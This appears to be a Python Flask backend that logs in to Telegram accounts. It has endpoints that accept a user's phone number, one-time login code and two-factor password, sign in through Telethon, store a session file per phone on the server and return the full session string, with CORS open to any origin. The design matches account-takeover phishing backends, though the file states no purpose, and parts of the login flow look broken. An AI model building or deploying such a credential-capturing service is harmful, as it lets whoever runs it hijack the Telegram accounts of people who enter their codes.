from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from flask_cors import CORS
import os
import asyncio
from dotenv import load_dotenv

load_dotenv()

API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")

SESSION_DIR = "session"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

app = Flask(__name__)
CORS(app)

@app.route("/")
def home():
    return "✅ Telegram Login Backend Aktif"

@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone", "").strip()

    if not phone or not phone.startswith("+"):
        return jsonify({"error": "Nomor telepon tidak valid"}), 400

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def send():
        async with TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH) as client:
            await client.start(phone=phone)  # Kirim kode OTP otomatis
        return {"status": "code_sent"}

    try:
        result = loop.run_until_complete(send())
        return jsonify(result), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def verify():
        async with TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH) as client:
            await client.sign_in(phone=phone, code=code)
            session_str = StringSession.save(client.session)
        return {"status": "logged_in", "session": session_str}

    try:
        result = loop.run_until_complete(verify())
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def verify():
        async with TelegramClient(f"{SESSION_DIR}/{phone}", API_ID, API_HASH) as client:
            await client.sign_in(password=password)
            session_str = StringSession.save(client.session)
        return {"status": "logged_in", "session": session_str}

    try:
        result = loop.run_until_complete(verify())
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
